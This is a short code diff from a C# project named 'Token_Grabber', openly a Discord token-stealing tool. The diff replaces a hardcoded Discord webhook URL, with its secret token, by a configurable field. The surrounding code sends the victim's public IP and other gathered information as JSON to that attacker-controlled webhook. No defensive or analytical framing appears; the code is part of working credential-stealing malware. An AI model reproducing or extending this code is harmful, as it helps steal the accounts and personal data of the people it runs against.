@@ -13,6 +13,8 @@ namespace Token_Grabber
     {
         public static string weblink = ("https://api.ipify.org/");
         public static string internalip = "Nothing";
+        public static string url = webhookinput.webhook;
+
         public PrintAllInfo()
         {
             SendInfo();
@@ -40,7 +42,6 @@ namespace Token_Grabber
         {
             GetLocalIPAddress();
             //Discord webhook url
-            string url = "https://discord.com/api/webhooks/960218299042508860/asK8bqJGh8I2EKSgCw2cQgrjAhwiiujHwZ39nwjD5WMNI8DkfBAT33NJcDTpROhXZJtk";
             string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":16745830}] }";
 
             string newjson = json.Insert(65, $"Public IP: {GetIp()}");
